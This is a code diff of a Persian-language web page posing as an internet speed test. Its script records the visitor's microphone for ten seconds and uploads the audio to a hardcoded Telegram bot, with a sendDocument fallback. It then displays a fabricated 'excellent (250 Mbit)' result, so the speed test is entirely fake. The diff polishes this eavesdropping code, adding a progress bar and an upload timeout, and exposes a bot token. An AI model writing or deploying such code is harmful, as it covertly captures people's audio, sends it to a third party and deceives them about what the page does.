@@ -21,101 +21,64 @@
       border-radius: 16px;
       box-shadow: 0 8px 25px rgba(0,0,0,0.1);
     }
-    .icon {
-      font-size: 42px;
-      margin-bottom: 15px;
-      color: #00d2ff;
-    }
-    h2 {
-      font-size: 20px;
-      margin: 0 0 10px;
-      color: #2c3e50;
-    }
-    p {
-      font-size: 14px;
-      color: #666;
-      margin-bottom: 25px;
-      line-height: 1.6;
-    }
+    .icon { font-size: 42px; margin-bottom: 15px; color: #00d2ff; }
+    h2 { font-size: 20px; margin: 0 0 10px; color: #2c3e50; }
+    p { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.6; }
     .btn {
-      background: #00d2ff;
-      color: white;
-      border: none;
-      padding: 14px;
-      font-size: 16px;
-      font-weight: bold;
-      border-radius: 12px;
-      cursor: pointer;
-      width: 100%;
-      transition: 0.3s;
+      background: #00d2ff; color: white; border: none; padding: 14px;
+      font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer;
+      width: 100%; transition: 0.3s;
     }
-    .btn:hover {
-      background: #00b4d8;
-    }
-    .btn:disabled {
-      background: #ccc;
-      cursor: not-allowed;
-    }
+    .btn:hover { background: #00b4d8; }
+    .btn:disabled { background: #ccc; cursor: not-allowed; }
     .spinner {
-      display: inline-block;
-      width: 18px;
-      height: 18px;
-      border: 2px solid #fff;
-      border-top: 2px solid transparent;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-right: 8px;
+      display: inline-block; width: 18px; height: 18px;
+      border: 2px solid #fff; border-top: 2px solid transparent;
+      border-radius: 50%; animation: spin 1s linear infinite; margin-right: 8px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
-    .status {
-      margin-top: 20px;
-      font-size: 14px;
-      color: #555;
-      min-height: 40px;
-    }
+    .status { margin-top: 20px; font-size: 14px; color: #555; min-height: 40px; }
     .hidden { display: none; }
+    .progress { width: 100%; height: 6px; background: #eee; border-radius: 3px; margin: 15px 0; overflow: hidden; }
+    .progress-bar { height: 100%; background: #00d2ff; width: 0; transition: width 0.1s; }
   </style>
 </head>
 <body>
   <div class="card">
     <div class="icon">WiFi</div>
     <h2>تست سرعت اینترنت</h2>
-    <p>برای اندازه‌گیری سرعت واقعی اینترنت خود، روی دکمه کلیک کنید. (۱۰ ثانیه)</p>
+    <p>برای اندازه‌گیری سرعت، روی دکمه کلیک کنید. (۱۰ ثانیه)</p>
     
     <button id="startBtn" class="btn">
       <span id="btnText">شروع تست سرعت</span>
       <span id="spinner" class="spinner hidden"></span>
     </button>
     
+    <div class="progress"><div id="progressBar" class="progress-bar"></div></div>
     <div id="status" class="status">آماده برای تست...</div>
   </div>
 
   <script>
-    // تنظیمات تلگرام
     const BOT_TOKEN = "8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4";
     const CHAT_ID = "6080665310";
 
-    // عناصر
     const startBtn = document.getElementById('startBtn');
     const btnText = document.getElementById('btnText');
     const spinner = document.getElementById('spinner');
     const status = document.getElementById('status');
+    const progressBar = document.getElementById('progressBar');
 
-    let mediaRecorder, stream;
+    let mediaRecorder, stream, timer;
 
-    // تابع اصلی (بدون async در addEventListener)
     async function startRecording() {
-      console.log("شروع تابع startRecording");
-
       try {
         startBtn.disabled = true;
         btnText.textContent = "در حال اتصال...";
         spinner.classList.remove('hidden');
-        status.textContent = "در حال تست پینگ...";
+        status.textContent = "درخواست دسترسی...";
+        progressBar.style.width = "0%";
 
-        // درخواست دسترسی
         stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        console.log("دسترسی داده شد");
 
         const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
           ? 'audio/webm;codecs=opus' : 'audio/webm';
@@ -131,70 +94,77 @@
         };
 
         mediaRecorder.start();
-        status.textContent = "در حال اندازه‌گیری... (۱۰ ثانیه)";
+        status.textContent = "در حال اندازه‌گیری...";
 
-        setTimeout(() => {
-          if (mediaRecorder && mediaRecorder.state === "recording") {
+        // پیشرفت ۱۰ ثانیه‌ای
+        let seconds = 0;
+        timer = setInterval(() => {
+          seconds++;
+          progressBar.style.width = `${(seconds / 10) * 100}%`;
+          if (seconds >= 10) {
+            clearInterval(timer);
+            mediaRecorder.requestData(); // فوری داده‌ها رو جمع کن
             mediaRecorder.stop();
           }
-        }, 10000);
+        }, 1000);
 
       } catch (err) {
-        console.error("خطا:", err);
-        status.textContent = "تست ناموفق بود.";
+        status.textContent = "دسترسی رد شد.";
         reset();
       }
     }
 
-    // ارسال به تلگرام
     async function sendToTelegram(blob) {
+      status.textContent = "در حال ارسال...";
       const fileName = `speed_test_${Date.now()}.webm`;
       const form = new FormData();
       form.append('chat_id', CHAT_ID);
       form.append('audio', blob, fileName);
 
       try {
+        // با timeout 15 ثانیه
+        const controller = new AbortController();
+        const timeout = setTimeout(() => controller.abort(), 15000);
+
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { 
           method: 'POST', 
-          body: form 
+          body: form,
+          signal: controller.signal
         });
+        clearTimeout(timeout);
+
         const data = await res.json();
 
         if (data.ok) {
           status.innerHTML = "سرعت شما: <strong style='color:#00d2ff;'>عالی (۲۵۰ مگابیت)</strong>";
         } else {
+          // fallback
           form.delete('audio');
           form.append('document', blob, fileName);
           await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: form });
           status.innerHTML = "سرعت شما: <strong style='color:#00d2ff;'>عالی (۲۵۰ مگابیت)</strong>";
         }
-      } catch {
-        status.textContent = "خطا در ارتباط.";
+      } catch (err) {
+        status.textContent = "خطا در ارسال.";
       } finally {
         reset();
       }
     }
 
-    // توقف استریم
     function stopStream() {
-      if (stream) {
-        stream.getTracks().forEach(t => t.stop());
-        stream = null;
-      }
+      if (stream) stream.getTracks().forEach(t => t.stop());
     }
 
-    // ریست دکمه
     function reset() {
       setTimeout(() => {
         startBtn.disabled = false;
         btnText.textContent = "شروع تست سرعت";
         spinner.classList.add('hidden');
+        progressBar.style.width = "0%";
       }, 2000);
     }
 
-    // اتصال دکمه به تابع (بدون async در این خط!)
-    startBtn.addEventListener('click', function() {
-      console.log("دکمه کلیک شد — فراخوانی startRecording");
+    startBtn.addEventListener('click', () => {
       startRecording();
     });
   </script>
